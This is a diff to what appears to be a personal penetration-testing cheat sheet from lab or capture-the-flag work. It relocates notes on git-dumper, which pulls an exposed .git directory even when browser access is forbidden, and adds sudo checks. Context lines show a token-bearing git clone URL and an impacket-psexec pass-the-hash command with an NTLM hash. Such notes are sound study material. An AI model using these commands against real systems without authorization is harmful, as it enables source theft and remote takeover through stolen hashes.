@@ -523,7 +523,6 @@ neo4j, bloodhound must be running.
 	1. Check neo4j, bloodhound are running
 	2. sudo python3 PlumHound.py --easy -p {neo4j password}
 	3. sudo python3 PlumHound.py -x tasks/default.tasks -p {neo4j password}  (write a report)
-cd reports 
 ```
 
 ## git
@@ -532,6 +531,20 @@ cd reports
 
 ```
 git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
+```
+
+### git-dumper
+
+- git-dumper dumps git repository to local.
+
+```
+pip install git-dumper
+```
+
+> even browser access to `/.git` is forbidden, it can still dump the repository
+
+```
+git-dumper http://bullybox.local/.git/ bullybox/
 ```
 
 ## evilwin-rm
@@ -602,16 +615,12 @@ Would you like to save the private key? (y/N)
 
 `impacket-psexec retro.vl/administrator@retro.vl -hashes :252fac7066d93dd009d4fd2cd0368389`
 
-## .git
+## sudo
 
-- git-dumper dumps git repository to local.
+- check sudo privilege.
 
-```
-pip install git-dumper
-```
+`sudo -l` 
 
-- even browser access to `/.git` is forbidden, it can still dump the repository
+- run sudo as other users
 
-```
-git-dumper http://bullybox.local/.git/ bullybox/
-```
+`sudo -u username`
